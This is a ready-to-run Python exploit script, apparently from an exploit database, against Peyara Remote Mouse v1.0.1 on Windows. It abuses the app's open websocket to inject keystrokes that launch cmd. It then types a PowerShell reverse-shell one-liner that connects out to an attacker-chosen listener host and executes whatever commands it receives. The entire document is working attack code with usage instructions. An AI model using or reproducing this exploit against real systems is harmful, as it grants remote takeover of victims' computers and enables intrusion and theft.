
# Exploit Title: Peyara Remote Mouse v1.0.1 - Remote Code Execution (RCE) 
# Date: 2025-05-30
# Exploit Author: tmrswrr
# Software Link: https://peyara-remote-mouse.vercel.app/
# Platform: Windows
# Version: v1.0.1
# Tested on: Windows 10

#usage : python3 Peyara.py --target 192.168.1.107 --lhost 192.168.1.110 --lport 4444

#!/usr/bin/env python3
import asyncio
import websockets
import json
import argparse

async def main(target, lhost, lport):
    uri = f"ws://{target}:1313/socket.io/?EIO=4&transport=websocket"
    async with websockets.connect(uri) as ws:

        # Engine.IO 'open' paketi
        open_frame = await ws.recv()
        print("[<] OPEN     ", open_frame)

        # Namespace connect
        await ws.send("40")
        ns_ack = await ws.recv()
        print("[<] NAMESPACE", ns_ack)

        # İlk ping/pong
        frame = await ws.recv()
        print("[<] FRAME    ", frame)
        if frame == "2":
            await ws.send("3")
            print("[>] PONG     3")
        
        # Küçük gecikme ekle
        await asyncio.sleep(1)

        # Ctrl+Esc komutunu gönder
        ctrl_esc_event = '42["edit-key",{"key":"escape","modifier":["control"]}]'
        await ws.send(ctrl_esc_event)
        print("[>] Ctrl+Esc EVENT SENT:", ctrl_esc_event)
        await asyncio.sleep(0.5)  # Uygulamanın tepki vermesi için bekle
        
        # CMD'yi açmak için komutları gönder (aralara gecikmeler ekle)
        await ws.send('42["key","c"]')
        await asyncio.sleep(0.2)
        await ws.send('42["key","m"]')
        await asyncio.sleep(0.2)
        await ws.send('42["key","d"]')
        await asyncio.sleep(0.2)
        await ws.send('42["key","enter"]')
        await asyncio.sleep(1)  # CMD'nin açılması için daha uzun bekle
        
        await ws.send('42["key","enter"]')  # Boş satır için
        await asyncio.sleep(0.5)
        
        # PowerShell komutunu gönder (FIXED STRING FORMATTING)
        ps_command = (
    f"powershell -nop -c \""
    f"$c=New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});"
    "$s=$c.GetStream();"
    "[byte[]]$b=0..65535|%{0};"
    "while(($i=$s.Read($b,0,$b.Length)) -ne 0){;"
    "$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);"
    "$r=iex $d 2>&1;"
    "$s.Write((New-Object -TypeName System.Text.ASCIIEncoding).GetBytes($r + 'PS > '),0,($r + 'PS > ').Length)"
    "}\""
)
        payload = '42' + json.dumps(["key", ps_command])
        await ws.send(payload)
        print("[>] PowerShell command sent")
        
        # Komutun yürütülmesi için biraz daha bekle
        await asyncio.sleep(4)
        await ws.send('42["key","enter"]')  # Komutu çalıştırmak için
        await asyncio.sleep(0.5)
        
        # Ping'lere cevap verme döngüsü
        while True:
            try:
                frame = await ws.recv()
                print("[<] FRAME    ", frame)
                
                if frame == "2":  # Ping geldiğinde
                    await ws.send("3")
                    print("[>] PONG     3")
                    
                if frame.startswith("341"):  # Namespace disconnect
                    print("[*] Namespace disconnect görüldü, çıkılıyor.")
                    break
                    
            except websockets.ConnectionClosed:
                print("[*] WebSocket bağlantısı kapandı")
                break

    print("[*] İşlem tamamlandı.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='WebSocket Exploit Script')
    parser.add_argument('--target', required=True, help='Target server IP address')
    parser.add_argument('--lhost', required=True, help='Listener IP address')
    parser.add_argument('--lport', required=True, type=int, help='Listener port')
    
    args = parser.parse_args()
    
    asyncio.run(main(args.target, args.lhost, args.lport))
